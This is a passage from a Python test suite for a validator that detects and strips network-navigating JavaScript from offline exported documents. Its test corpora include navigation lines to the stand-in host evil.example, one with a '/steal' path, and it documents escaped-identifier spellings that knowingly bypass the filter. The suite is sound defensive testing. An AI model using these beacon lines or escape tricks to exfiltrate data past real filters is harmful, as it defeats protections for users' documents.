        # Not the top-level document: some other object's `location` (frame-src 'none' blocks
        # frames anyway).
        'frame.location.href = "https://evil.example"',
        'cfg.location.href = "https://evil.example"',
        # A local binding whose name only case-FOLDS to `location` under Python's Unicode rules
        # (the dotless i). JS `/i` does not fold it, so without `re.ASCII` the validator rejected
        # source the exporter preserves. Keeping it in the BENIGN list pins both engines.
        'locat\u0131on.href = "https://evil.example"',
        '\u017felf.location.href = "https://evil.example"',
        # A purely LOCAL binding whose name merely ENDS in `location` behind a NON-ASCII identifier
        # character. JavaScript identifiers are not ASCII, so an ASCII-ONLY boundary class makes
        # every one of these read as the document's own sink and deletes an author's whole script -
        # the false-positive direction that costs content. The astral one is the cross-engine case:
        # it is a surrogate PAIR to `charAt` and a single code point to Python, so a class that only
        # widened for one of them would make the two engines disagree.
        '\u00e9location.href = "https://evil.example"',
        '\u0440location.href = "https://evil.example"',
        '\U0001d425location.href = "https://evil.example"',
        'var x = 1; \u00e9location.href = "https://evil.example"',
        '\u00e9location.assign("https://evil.example")',
        '\u00e9location = "https://evil.example"',
        '\u00e9window.location.href = "https://evil.example"',
        '\u00e9top.open("https://evil.example")',
        # A LOCAL binding named `location` makes an unprefixed sink refer to that object, not the
        # document - `const location = { href: "" }; location.href = <url>` navigates nothing, so
        # deleting the whole script over it is content loss. Shadow-awareness suppresses only the
        # UNPREFIXED sinks; the prefixed cases below still fire.
        'const location = { href: "" }; location.href = "https://api.example";',
        'let location = {}; location.assign("https://api.example");',
        'function f(location) { location.href = "https://api.example"; }',
        # The ANONYMOUS spellings, which are the branch where the optional function-name group is
        # SKIPPED rather than taken. Every other `function` sample here is named, so without these
        # the zero-identifier path of the CURRENT pattern is unpinned and dropping that group's `?`
        # is a green mutant that deletes an author's script. (The pattern this replaced spelled the
        # same branch as `{0,100}`, so these were already benign then - what they pin is the
        # restructuring, not a fixed bug.)
        'function (location) { location.href = "https://api.example"; }',
        'function(location) { location.href = "https://api.example"; }',
        'const { location } = opts; location.href = "https://api.example";',
        # A binding that is NOT the first thing in the window, so the leading boundary has to be
        # found rather than assumed. Every other sample here puts `location` straight after the
        # `(` or `{`, where the opener itself is the boundary, so these are what would catch a
        # narrowing that rejects a later parameter or a renamed-TO `location`.
        'function f(a, location) { location.href = "https://api.example"; }',
        'const {href: location} = opts; location.href = "https://api.example";',
        'try { x(); } catch (location) { location.href = "https://api.example"; }',
        # A relative navigation inside the offline file is not egress.
        'location.href = "#section-2";',
        'location.assign("./other.html")',
        # The false-positive controls for the SCHEME-ONLY widening. A `https:`/`http:` literal is
        # not a navigation just because it sits near one: a comparison, a plain scheme string, and
        # a shadowed sink must all still survive.
        'if (location.href === "https:api.example.org/v1") return;',
        'var SECURE = "https:"; if (location.protocol === SECURE) document.title = "s";',
        'const location = { href: "" }; location.href = "https:api.example";',
        # A relative path that merely CONTAINS a colon is not a scheme.
        'location.href = "./a:b.html"',
        # The false-positive controls for the NORMALIZED-URL widening. A match DELETES the whole
        # script, so padding, a tab or a backslash next to a URL must not be enough on its own.
        'var TIP = "  https://docs.example.org/x"; if (location.hash) document.title = TIP;',
        'location.href = " #section-2";',
        'location.href = "\tabout.html"',
        'location.assign("\t./other.html")',
        r'location.href = "\n"',
        r'location.href = "\\d+"',
        'if (location.href === " https://evil.example") return;',
        'const location = { href: "" }; location.href = " https://api.example";',
        # A NUL is NOT padding a browser strips: the HTML parser replaces a U+0000 in script data
        # with U+FFFD (verified in chromium), which the URL parser leaves in place, so neither of
        # these navigates - and matching them would make this validator, which reads the RAW text,
        # reject a document the exporter (which reads the parsed text) preserves.
        'location.href = "\u0000https://evil.example"',
        'location.href = "\ufffdhttps://evil.example"',
        # Backslash PARITY is what decides local from network, and it is invisible to every other
        # test: a JS string literal spends TWO source backslashes per runtime backslash, so three
        # source backslashes leave ONE runtime backslash (a local path) where four leave two (an
        # authority). A refactor to a naive `[\\/]{2}` would match this and delete the script.
        r'location.href = "\\\evil.example"',
        'location.href = "  /local/path.html"',
        # An EVEN run of backslashes before the scheme is a real backslash at runtime, which a
        # browser resolves as a local path - the escaping-backslash tolerance must not swallow it.
        r'location.href = "\\https://evil.example"',
    ]

    # Each escaped IdentifierName spelling the corpora below are built from, paired with the name
    # the JavaScript PARSER resolves it to. This is a language claim, and it is easy to get wrong:
    # `locatio\u006En` is `locationn`, not `location`, so a sample built from it is dead source that
    # would "pin" nothing. Ask the parser instead of assuming. Both escape spellings are listed, and
    # a FIRST-character case beside a later-character one, for each POSITION the scan matches
    # literally - the prefix name, the sink name and the property name are three independent code
    # paths (a backwards walk, an anchor and a sticky tail), so closing one of them would otherwise
    # leave this corpus green.
    _NAV_ESCAPED_IDENTIFIERS = [
        (r"locatio\u006E", "location"),
        (r"locatio\u{6E}", "location"),
        (r"\u006Cocation", "location"),
        (r"l\u006Fcation", "location"),
        (r"l\u{6F}cation", "location"),
        (r"\u006Fpen", "open"),
        (r"op\u0065n", "open"),
        (r"\u{6F}pen", "open"),
        (r"hre\u0066", "href"),
        (r"hre\u{66}", "href"),
        (r"\u0068ref", "href"),
        (r"assig\u006E", "assign"),
        (r"\u0061ssign", "assign"),
        (r"replac\u0065", "replace"),
        (r"windo\u0077", "window"),
        (r"windo\u{77}", "window"),
    ]
    # The UNDER-match direction of the identifier-escape class, as `(escaped, plain twin)` pairs.
    # Each escaped sample is a REAL top-level navigation to a network URL - an escape names exactly
    # the property its plain spelling does - and each is a DOCUMENTED MISS of the strip, not a
    # benign script: the scan is driven from the LITERAL `location` / `open` anchors and matches the
    # prefix and property names as literal text, so an escape in ANY identifier of the chain, at any
    # position in it, steps around it. The plain twin is the positive control that makes the miss
    # mean something: without it a sample that stopped being a sink for an unrelated reason (a
    # mangled URL, a lost `=`, an off-by-one escape) would keep passing and pin nothing. Each pair
    # must DERIVE from its twin by substituting exactly one spelling above, which is what keeps the
    # off-by-one out - a substring test would not, since `locatio\u006E` sits inside `locatio\u006En`.
    _NAV_CORPUS_ESCAPED_IDENTIFIER_MISSES = [
        (r'window.locatio\u006E.href = "https://evil.example/steal";',
         'window.location.href = "https://evil.example/steal";'),
        (r'locatio\u006E.href = "https://evil.example";',
         'location.href = "https://evil.example";'),
        (r'window.locatio\u{6E}.href = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'window.\u006Cocation.href = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'window.\u006Fpen("https://evil.example");',
         'window.open("https://evil.example");'),
        (r'window.op\u0065n("https://evil.example");',
         'window.open("https://evil.example");'),
        (r'window.\u{6F}pen("https://evil.example");',
         'window.open("https://evil.example");'),
        (r'window.location.hre\u0066 = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'window.location.hre\u{66} = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'window.location.\u0068ref = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'window.location.assig\u006E("https://evil.example");',
         'window.location.assign("https://evil.example");'),
        (r'window.location.\u0061ssign("https://evil.example");',
         'window.location.assign("https://evil.example");'),
        (r'top.location.replac\u0065("https://evil.example");',
         'top.location.replace("https://evil.example");'),
        (r'windo\u0077.location.href = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        (r'windo\u{77}.location.href = "https://evil.example";',
         'window.location.href = "https://evil.example";'),
        # An OUTER prefix, dot-joined with no whitespace. The walk consumes the literal `top`, then
        # needs a boundary in front of it and finds the `.` of the escaped name, which is an
        # identifier character - so the escape defeats the scan from any depth of the chain, not
        # just from the element beside the sink.
        (r'windo\u0077.top.location.href = "https://evil.example";',
         'window.top.location.href = "https://evil.example";'),
        (r'windo\u0077?.top.open("https://evil.example");',
         'window?.top.open("https://evil.example");'),
    ]
    # The OVER-match direction of the SAME class, and the one with a user-visible cost. The local
    # binding that suppresses an unprefixed sink (`OFFLINE_LOCAL_LOCATION_RE`) also matches
    # `location` as literal text, so an escaped DECLARATION does not register as a shadow and the
    # script is DELETED whole - although it navigates nothing, since the reference beside it names
    # that same local binding. Pinned as `(escaped, plain twin)` where the escaped sample is
    # STRIPPED and the plain twin is KEPT, because the residual is only honest if it names the
    # direction that loses an author's content, not just the one that lets a beacon through.
    _NAV_CORPUS_ESCAPED_SHADOW_OVERMATCHES = [
        (r'const l\u006Fcation = { href: "" }; location.href = "https://api.example";',
         'const location = { href: "" }; location.href = "https://api.example";'),
        (r'let l\u{6F}cation = {}; location.assign("https://api.example");',
         'let location = {}; location.assign("https://api.example");'),
        (r'function f(l\u006Fcation) { location.href = "https://api.example"; }',
         'function f(location) { location.href = "https://api.example"; }'),
    ]
    # The one shape an escape does NOT defeat, and the reason it does not. A prefix name separated
    # from its `.` by WHITESPACE leaves the walk a legal boundary AT that run, so the literal
    # remainder of the chain qualifies on its own and the sample is stripped exactly as its plain
    # twin is. That is incidental to the escape rather than a defence, which is what
    # `_NAV_CORPUS_WHITESPACE_BOUNDARY_CONTROLS` proves: an arbitrary non-sink identifier in the
    # same position is stripped too, so the whitespace is doing the work. Without that control these
    # samples would keep passing if the escape class were closed outright, and would pin nothing.
    _NAV_CORPUS_ESCAPED_WHITESPACE_BOUNDARY = [
        (r'windo\u0077 . top.location.href = "https://evil.example";',
         'window . top.location.href = "https://evil.example";'),
        (r'if (x) { windo\u0077 . location.href = "https://evil.example"; }',
         'if (x) { window . location.href = "https://evil.example"; }'),
    ]
    _NAV_CORPUS_WHITESPACE_BOUNDARY_CONTROLS = [
        'zzz . top.location.href = "https://evil.example";',
        'if (x) { zzz . location.href = "https://evil.example"; }',
    ]

    def _escaped_nav_pairs(self):
        """Every `(escaped, plain, escaped_hits, plain_hits)` case in the corpora above."""
        return ([(esc, plain, False, True)
                 for esc, plain in self._NAV_CORPUS_ESCAPED_IDENTIFIER_MISSES]
                + [(esc, plain, True, False)
                   for esc, plain in self._NAV_CORPUS_ESCAPED_SHADOW_OVERMATCHES]
                + [(esc, plain, True, True)
                   for esc, plain in self._NAV_CORPUS_ESCAPED_WHITESPACE_BOUNDARY])

    def test_the_escaped_identifier_spellings_name_the_sinks_they_claim(self):
        """Pin the LANGUAGE claim the documented residual rests on, not just the scan's verdict.

        A residual is only worth documenting if the shape it describes really is the sink it says.
        An escaped IdentifierName is exactly the kind of claim that is easy to write down wrongly -
        the off-by-one `locatio\\u006En` resolves to `locationn`, which navigates nothing and would
        make the corpora below prove the opposite of what they say - so the spellings go to the real
        parser and are compared against the plain names they are filed as. Each escaped sample is
        then tied BACK to that verified list by DERIVATION: substituting one verified spelling for
        its plain name must turn the sample into its twin exactly. A substring test is not enough,
        because `locatio\\u006E` sits inside the off-by-one spelling and would satisfy it.
        """
        pairs = self._escaped_nav_pairs()
        used = set()
        for escaped, plain, _, _ in pairs:
            derived = [spelling for spelling, name in self._NAV_ESCAPED_IDENTIFIERS
                       if escaped.replace(spelling, name) == plain]
            self.assertTrue(
                derived,
                "the escaped sample %r does not become its plain twin %r by substituting any "
                "parser-verified spelling, so nothing has checked what it resolves to - it may be "
                "dead source that pins the opposite of what it claims" % (escaped, plain))
            used.update(derived)
        for spelling, _ in self._NAV_ESCAPED_IDENTIFIERS:
            self.assertIn(spelling, used,
                          "the spelling %s is verified against the parser but no corpus sample "
                          "uses it, so one of the three literal-matching code paths lost its "
                          "coverage while this test kept passing" % spelling)
        node = shutil.which("node")
        if not node:
            # The derivation half above already asserted; the parser half is extra, as elsewhere.
            return
        script = (
            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "const names=p.names.map(n=>{try{return {ok:true,v:Object.keys("
            "(0,eval)('({'+n+':1})'))[0]};}catch(e){return {ok:false,v:String(e&&e.message)};}});"
            "const parses=p.samples.map(s=>{try{new Function(s);return '';}"
            "catch(e){return String(e&&e.message)||'rejected';}});"
            "process.stdout.write(JSON.stringify({names:names,parses:parses}));});"
        )
        spellings = [spelling for spelling, _ in self._NAV_ESCAPED_IDENTIFIERS]
        samples = [escaped for escaped, _, _, _ in pairs]
        got = self._run_nav_node(node, script, {"names": spellings, "samples": samples},
                                 "the escaped identifier spellings")
        self.assertEqual(len(got.get("names", [])), len(self._NAV_ESCAPED_IDENTIFIERS),
                         "node returned %d names for %d spellings"
                         % (len(got.get("names", [])), len(self._NAV_ESCAPED_IDENTIFIERS)))
        self.assertEqual(len(got.get("parses", [])), len(samples),
                         "node returned %d parse results for %d samples"
                         % (len(got.get("parses", [])), len(samples)))
        for (spelling, expected), result in zip(self._NAV_ESCAPED_IDENTIFIERS, got["names"]):
            self.assertTrue(result["ok"],
                            "the JS parser rejects the identifier %s, so every sample built from "
                            "it is dead source: %s" % (spelling, result["v"]))
            self.assertEqual(
                result["v"], expected,
                "the JS parser reads the identifier %s as %r, not the %r the escaped corpora "
                "assume - the sample is not the sink it is filed as"
                % (spelling, result["v"], expected))
        # Resolving the NAME is not enough: the escape sits in a member-access or binding position
        # in the samples, where the grammar is stricter than the object-literal key position above
        # (node accepts `({\u0069f:1})` but rejects `var \u0069f`). Compile each sample - never run
        # it - so a spelling that is only legal as a key cannot pass as a beacon.
        for sample, error in zip(samples, got["parses"]):
            self.assertFalse(error,
                             "the JS parser rejects %r, so the sample is dead source rather than "
                             "the navigation it is filed as: %s" % (sample, error))

    def test_the_escaped_identifier_sink_is_the_documented_residual_in_both_engines(self):
        """The identifier-escape bypass is a DOCUMENTED residual, and it is pinned as one.

        `location` / `open` are found as literal text, and so are the global prefix names in front
        of the sink and the `href` / `assign` / `replace` after it, so a `\\uXXXX` (or `\\u{...}`)
        escape in ANY identifier of the chain walks past the exporter's strip AND past the strict
        validator - the file is preserved and then blessed as offline-clean - while the same literal
        matching in the local-binding shadow rule DELETES a script that navigates nothing. Both
        directions are deliberate rather than overlooked: the anchors are what make the scan linear
        over every inline script including the vendored payload's inflated megabytes, and
        recognizing each identifier of the chain in both escape spellings would close a channel that
        computed access (`location["href"]`) leaves open for a shorter edit anyway. What this test
        buys is that the decision cannot be reversed in SILENCE. Every escaped sample is paired with
        its PLAIN twin and the twin's verdict is asserted too, so the escape is provably the sole
        cause of the difference; without that a sample that decayed into a non-sink would keep
        passing and pin nothing. The whitespace-boundary pair is the exception that proves it, and
        carries a further control: the same shape with an ordinary non-sink identifier in place of
        the escaped prefix is stripped too, which is what shows the whitespace rather than the
        escape is doing the work there.
        """
        pairs = self._escaped_nav_pairs()
        for escaped, plain, esc_hit, plain_hit in pairs:
            self.assertEqual(
                resources.offline_script_navigates_to_network(escaped), esc_hit,
                "the validator's verdict on %r changed. If the identifier-escape class was closed "
                "(or its over-match fixed) on purpose, move the sample into the corpus that now "
                "describes it and update the CMH-OFFLINE-05 residual, which still documents this "
                "behavior" % escaped)
            self.assertEqual(
                resources.offline_script_navigates_to_network(plain), plain_hit,
                "the PLAIN twin %r no longer behaves as the control this pin needs, so the escaped "
                "sample beside it proves nothing about the escape" % plain)
        for sample in self._NAV_CORPUS_WHITESPACE_BOUNDARY_CONTROLS:
            self.assertTrue(
                resources.offline_script_navigates_to_network(sample),
                "%r is no longer matched, so the whitespace-boundary pair beside it may be passing "
                "because of the ESCAPE rather than the whitespace - which is the opposite of what "
                "the CMH-OFFLINE-05 residual says about that shape" % sample)
        node = shutil.which("node")
        if not node:
            # The validator half above already asserted; the JS half is extra, as elsewhere here.
            return
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify("
            "p.map(_offlineScriptNavigatesToNetwork)));});"
        )
        payload = ([escaped for escaped, _, _, _ in pairs]
                   + [plain for _, plain, _, _ in pairs]
                   + list(self._NAV_CORPUS_WHITESPACE_BOUNDARY_CONTROLS))
        expected = ([esc_hit for _, _, esc_hit, _ in pairs]
                    + [plain_hit for _, _, _, plain_hit in pairs]
                    + [True] * len(self._NAV_CORPUS_WHITESPACE_BOUNDARY_CONTROLS))
        verdicts = self._run_nav_node(node, script, payload, "the escaped-identifier corpus")
        self.assertEqual(len(verdicts), len(payload),
                         "node returned %d verdicts for %d samples"
                         % (len(verdicts), len(payload)))
        for sample, hit, want in zip(payload, verdicts, expected):
            self.assertEqual(
                hit, want,
                "the REAL JS engine's verdict on %r disagrees with the CMH-OFFLINE-05 residual, "
                "which documents this behavior - the code and the residual must move together"
                % sample)

    # The unprefixed sink every shadow sample below is measured against. It is the whole point of
    # the shadow rule: with a local binding the script assigns a URL to that object and navigates
    # NOTHING (so the exporter must keep it), and without one it navigates the real document (so
    # the exporter must drop it). Appending the SAME sink to every sample is what makes the corpus
    # test the shadow decision rather than the sink scan.
    _NAV_SHADOW_SINK = ' location.href = "https://api.example";'

    # REAL bindings named `location` that the raw-source character window could not see, so the
    # exporter DELETED the author's script and `--strict` rejected a clean document. Every one of
    # these declares `location` in the script's own scope, so the unprefixed sink beside it is that
    # object's `href` and the whole script must survive.
    _NAV_SHADOW_BINDINGS = [
        # Arrow parameters, parenthesized and bare - neither follows `function` or `catch`, so the
        # window never looked at them at all.
        'const f = (location) => {};',
        'location => {};',
        # A BARE arrow parameter inside an initializer or a default: the name sits in a
        # default-value expression, and it is still that arrow's own parameter, so testing the
        # default first would have deleted the script.
        'let f = location => {};',
        'function setup(cb = location => {}) {}',
        'async (location) => {};',
        'const f = ({href: location}) => {};',
        # Method and `constructor` shorthand, in an object literal and in a class body.
        'var o = {m(location) {}};',
        'class A { m(location) {} }',
        'class A { constructor(location) {} }',
        'var o = {m(location) {}, n() {}};',
        # Generators, in all three star spellings.
        'function* g(location) {}',
        'function *g(location) {}',
        'function * g(location) {}',
        # A `}`, `]` or `)` spent INSIDE the window ended the old `[^}\]]` / `[^)]` run, so a
        # binding behind a nested pattern or a call in a default was invisible.
        'const {a: {b}, location} = o;',
        'const [a, [b], location] = o;',
        'function f(a = g(), location) {}',
        'const {a = (1), location} = o;',
        # The catch arm allowed only whitespace between `(` and the name, so a comment disarmed it.
        'try { x(); } catch (/*x*/ location) {}',
        # A non-ASCII function name is not in the `[A-Za-z0-9_$]{1,100}` name slot.
        'function \u00fcn\u00efcode(location) {}',
        # A binding more than 400 characters into the list, which is past the window outright.
        'function f(' + "a" * 450 + ', location) {}',
        # Rest bindings. The `...` is three `.` characters, which a member-access test reads as
        # `obj.location` unless the token is recognized - and these are real bindings the CHARACTER
        # WINDOW got right, so missing them would be a regression rather than a leftover.
        'function f(...location) {}',
        'const {a, ...location} = o;',
        'const [a, ...location] = xs;',
        # A computed or quoted method name: the name slot is a `]` or a string rather than an
        # identifier, so the opener has to survive both.
        'var o = {"m"(location) {}};',
        'class A { [key](location) {} }',
        # `using` declares a lexical binding exactly as `const` does.
        'function f() { using location = res; }',
        # The declaration forms whose NAME is the binding.
        'function location() {}',
        'class location {}',
        # A `for` head declaration, which is a declaration inside a parenthesized group.
        'for (const location of xs) {}',
        # A named import binds the name; the module specifier is a string the scanner must skip.
        'import {location} from "./x";',
        # A NAMESPACE import binds the name after `as`, and reaches the declaration through the `*`
        # arm of the keyword guard rather than through a name or a pattern.
        'import * as location from "./x";',
        # An UNTERMINATED quote must not swallow the rest of the script: a `'`/`"` literal cannot
        # carry a raw line terminator, so a lone quote is punctuation and the binding below it is
        # still found. Swallowing it would delete an author's script.
        'var q = "unclosed;\nconst location = 1;',
        # A comment sitting exactly where the look-ahead peeks - between a method's `)` and its
        # body, and between an arrow's `)` and its `=>`. Both are legal, and a peek that stopped
        # skipping comments would read the shape as something else entirely.
        'var o = {m(location) /*c*/ {}};',
        'const f = (location) /*c*/ => {};',
        # MALFORMED input (this is arbitrary, possibly damaged or minified text, not a parse): a
        # COMPOUND operator must not be read as the `=` that opens a default value, or the
        # parameter after it stops being a binding.
        'function f(a != b, location) {}',
        'const f = (a += location) => {};',
        'const f = (a == location) => {};',
        # A postfix `++` ends a VALUE, so the `/` after it divides. Read as a regex, the scan would
        # swallow the declaration behind it and delete a script that navigates nothing.
        'x++ / y; let location = {}; /z/;',
        # A declaration whose line break falls inside a BLOCK COMMENT still ends there, but one that
        # is only a continuation does not: this list carries on after the comment.
        'let a = 1, /*\n*/ location = 2;',
    ]

    # Text that MENTIONS `location` without declaring anything. The window matched raw characters,
    # so each of these disarmed the rule and bought the script the shadowed treatment - which meant
    # the beacon beside it was preserved and blessed. Tokenizing the declaration closes them.
    _NAV_SHADOW_MENTIONS = [
        # A comment or a string inside the window - the cheapest deliberate disarm there was.
        'function f(a /* location */) {}',
        'function f(a // location\n) {}',
        'function f(a = " location ") {}',
        'var s = "const location";',
        '/* const location */',
        '// var location\n',
        'var re = /const location/;',
        # A parameter or destructuring DEFAULT names the outer binding; it declares nothing.
        'function f(q = location) {}',
        'const {a = location} = o;',
        # A property KEY renamed away binds `renamed`, not `location`.
        'const {location: renamed} = opts;',
        # A non-ASCII identifier character in the boundary slot: `\u03c0location` and `location\u03c0`
        # are ordinary names that merely CONTAIN `location`, exactly like `newLocation`.
        'function f(\u03c0location) {}',
        'var location\u03c0 = 1;',
        # A method or accessor NAMED `location` defines a property, not a binding.
        'var o = {location(a) {}};',
        'class A { get location() { return 1; } }',
        # A default expression in an ARROW parameter list. The bare-`function` twin above is caught
        # by a different branch (its opener is dropped), so without this row the arrow branch could
        # report a shadow for a name it only READS and nothing would notice.
        'const f = (q = location) => {};',
        'const f = async (q = location) => {};',
        'const f = ({a = location}) => {};',
        # A call whose `)` happens to be followed by a block on the NEXT line. ASI puts a statement
        # boundary between them, so this is a call and a block, not a method definition - reading it
        # as one disarmed the whole script with no aliasing and no obfuscation.
        'report(location)\n{ }',
        'function f() { report(location)\n{ } }',
        # A declaration that ends by ASI rather than a semicolon. `let x` on its own line binds `x`
        # and nothing else, so the next line's `location` is the document's. Each of these puts the
        # name in a position the OTHER guards do not already answer - a bare assignment and a call
        # argument, never `location.href`, whose `.` would decide it before ASI was consulted.
        'let x\nlocation = 1;',
        'let x\nfoo(location);',
        'var a, b\nfoo(location);',
        'import a from "./m"\nfoo(location);',
        'let x /*\n*/ foo(location);',
        'let x; foo(location);',
        'let x\n',
        'var a, b\n',
        'import a from "./m"\n',
        'import "./m"\n',
        # A member access is not a declarator name even in a declaration.
        'let o.location = 1;',
        # `import` and `using` in EXPRESSION position declare nothing at all.
        'import("./m")\n',
        'import.meta.url\n',
        'using(location)\n',
        # A computed KEY inside an object pattern reads the outer binding; it declares nothing.
        'const {[location]: renamed} = o;',
        # A property key that happens to be spelled like a declaration keyword.
        'var o = {const: 1, location: 2};',
        # ... and one spelled like `function`, `class` or `catch`, whose name and parameter-list
        # state must not leak past the `:` onto an unrelated later call.
        'f({class: location});',
        'f({function: location});',
        'render({class: location.href});',
        'var t = [{catch: 1}, f(location)];',
        'var t = [{function: 1}, g(location)];',
        # A `location` reached through a member access, a call or an index is not a declarator name.
        'var o = {}; o.location = 1;',
        # A default expression that CALLS something, and a computed key, inside what would otherwise
        # be an arrow parameter list: both only READ the outer binding, so neither may travel out of
        # its group and make the group look like a parameter list.
        'const f = (q = foo(location)) => {};',
        'const f = ({[location]: x}) => {};',
        # An import alias binds the name AFTER `as`; the one before it is the imported name.
        'import {location as renamed} from "./x";',
        # A declaration whose line break sits inside a BLOCK COMMENT ends there just the same, so
        # the next line's `location` is the document's.
        'let x /*\n*/ ',
        # `<!--` is a line comment in a classic script, so what follows it on that line is not code.
        '<!-- const location = 1;\n',
        # A call in a class `extends` clause, whose `)` really is followed by a `{`. It is the
        # ENCLOSING frame that tells a method definition from this: a method shorthand only exists
        # inside an object literal or a class body.
        'class A extends report(location) {}',
        # No LineTerminator may precede `=>`, so this is not an arrow function at all.
        'location\n=> {};',
        # The ITERABLE half of a `for` head is an expression, not a continuation of the pattern -
        # and iterating an object literal or an array that mentions `location` is an ordinary idiom.
        'for (const x of [location]) foo(x);',
        'for (const [k, v] of Object.entries({location, other})) foo(k, v);',
        'for (const k in {location}) foo(k);',
    ]

    # Shapes the tokenizer still answers the DOCUMENTED way rather than the strictly correct one,
    # pinned so the decision cannot drift in silence. The rule answers "does this script declare a
    # `location` anywhere", not "is that binding in scope AT the sink", because the arm is a
    # false-positive reducer rather than a security boundary (see CMH-OFFLINE-05): scope-tracking
    # would buy an author nothing that aliasing does not already give them.
    _NAV_SHADOW_RESIDUAL_SHADOWS = [
        'function g() { var location = 1; }',
        'if (x) { let location = 1; }',
        # A declaration keyword whose NAME is on the next line: ASI cannot end a declaration that
        # has bound nothing yet, so this is still read as one.
        'let\nlocation = {};',
        # A call followed by a block on the SAME line, inside a block, object literal or class body.
        # That is not valid JavaScript, but it is text this scan still has to answer for, and the
        # enclosing `{` is what a genuine method shorthand shares with it.
        'function f() { report(location) { } }',
    ]

    # The residuals in the OTHER direction: a real binding the tokenizer does not see, so the script
    # is deleted. Each is listed in the CMH-OFFLINE-05 row, and each is pinned here so the row and
    # the code cannot drift apart. They are the price of the two rules beside them - the reserved
    # word list is what stops `if (location) {` being read as a method - and none is reachable by
    # accident in ordinary code.
    _NAV_SHADOW_RESIDUAL_MISSES = [
        # A method whose NAME is a reserved word.
        'var o = {delete(location) {}};',
        # A method written in Allman style: a `{` on the next line is how an ordinary call followed
        # by a block is told apart from a method body, and that costs this spelling.
        'var o = {m(location)\n{}};',
        # An ESCAPED declaration, which the arm reads as literal text exactly as the escaped SINK
        # beside it is read.
        'const l\\u006Fcation = { href: "" };',
        # A binding introduced by `with` (or `eval`, or the `Function` constructor) exists only at
        # run time, so no tokenizer can see it.
        'with ({location: {href: ""}}) { }',
    ]

    # A LineContinuation before a CRLF escapes BOTH characters. Reading only the CR left the LF
    # looking like a bare line terminator, which ENDED the string literal and handed its text to the
    # tokenizer as code - so a string could plant a fake binding and disarm the arm. The sample is
    # built here rather than written inline so the CRLF cannot be normalized away by an editor.
    _NAV_SHADOW_CRLF_STRING = 'var s = "a\\\r\n, location ";'

    def _shadow_samples(self):
        """Every `(script, navigates)` pair the shadow corpora above assert."""
        return ([(sample + self._NAV_SHADOW_SINK, False)
                 for sample in self._NAV_SHADOW_BINDINGS]
                + [(sample + self._NAV_SHADOW_SINK, True)
                   for sample in self._NAV_SHADOW_MENTIONS]
                + [(self._NAV_SHADOW_CRLF_STRING + self._NAV_SHADOW_SINK, True)]
                + [(sample + self._NAV_SHADOW_SINK, False)
                   for sample in self._NAV_SHADOW_RESIDUAL_SHADOWS]
                + [(sample + self._NAV_SHADOW_SINK, True)
                   for sample in self._NAV_SHADOW_RESIDUAL_MISSES])

    def test_the_local_location_shadow_is_decided_on_bindings_not_a_character_window(self):
        """The shadow arm must read DECLARATIONS, not a character window over raw source.

        It decides whether an unprefixed sink is measured against the document's `location` or a
        local object, so it fails in two directions and both have a cost. A real binding it cannot
        see (an arrow parameter, a method or `constructor` shorthand, a generator, a nested pattern
        that spends a `}` inside the window, a comment inside `catch (`, a non-ASCII function name)
        makes the exporter DELETE a script that navigates nothing and `--strict` reject the file it
        just wrote - the direction that costs an author content. A mere MENTION that disarms it (a
        `location` in a comment, a string, a parameter default, or a renamed-away property key)
        suppresses the sink beside it, which is the direction that preserves a beacon.

        Both are asserted through the PUBLIC predicate rather than the shadow helper alone, because
        the shadow answer only matters through it: what an author sees is a script kept or deleted.
        """
        for sample, navigates in self._shadow_samples():
            self.assertEqual(
                resources.offline_script_navigates_to_network(sample), navigates,
                "the shadow decision on %r is wrong. A sample that must NOT navigate declares its "
                "own `location`, so deleting the script is content loss; one that MUST navigate "
                "declares nothing, so suppressing the sink preserves a beacon." % sample)
            self.assertEqual(
                resources.offline_local_location_shadow(sample), not navigates,
                "the shadow helper and the predicate disagree about %r" % sample)

    def test_the_local_location_shadow_agrees_in_the_real_js_engine(self):
        """The exporter's own shadow scanner must answer the corpus above identically.

        The two copies are hand-mirrored code now rather than one shared regex literal, so text
        equality can no longer carry the parity: only running the exporter's source can. A
        divergence here is the usual pair of failures - the validator rejecting the file the
        exporter just produced, or blessing one it no longer protects.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        samples = self._shadow_samples()
        script = (
            self._runtime_nav_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);"
            "process.stdout.write(JSON.stringify(p.map(s=>["
            "_offlineScriptNavigatesToNetwork(s),_offlineLocalLocationShadow(s)])));});"
        )
        verdicts = self._run_nav_node(node, script, [sample for sample, _ in samples],
                                      "the local-binding shadow corpus")
        self.assertEqual(len(verdicts), len(samples),
                         "node returned %d verdicts for %d shadow samples"
                         % (len(verdicts), len(samples)))
        for (sample, navigates), (js_navigates, js_shadow) in zip(samples, verdicts):
            self.assertEqual(js_navigates, navigates,
                             "the REAL JS engine disagrees with the validator about %r" % sample)
            self.assertEqual(js_shadow, not navigates,
                             "the REAL JS engine's shadow helper disagrees about %r" % sample)

    # The shadow scanner is hand-mirrored code in two languages, so the shared DATA it is driven
    # from is pinned the way `_OFFLINE_NAV_PREFIX_NAMES` is: a keyword only one side knows about is
    # a binding one engine sees and the other does not, which is the same drift in a new place.
    _NAV_SHADOW_NAME_LISTS = (
        ("_OFFLINE_SHADOW_DECL_KEYWORDS", "OFFLINE_SHADOW_DECL_KEYWORDS"),
        ("_OFFLINE_SHADOW_NON_METHOD", "OFFLINE_SHADOW_NON_METHOD"),
        ("_OFFLINE_SHADOW_REGEX_PRECEDERS", "OFFLINE_SHADOW_REGEX_PRECEDERS"),
        ("_OFFLINE_SHADOW_COMPOUND_OPS", "OFFLINE_SHADOW_COMPOUND_OPS"),
    )

    def test_the_python_and_js_shadow_scanners_are_mirrored(self):
        """The two shadow scanners must be the same scanner: same helpers, same word lists."""
        source = self._read("68-export-offline.js")
        for js_name, py_name in self._NAV_SHADOW_NAME_LISTS:
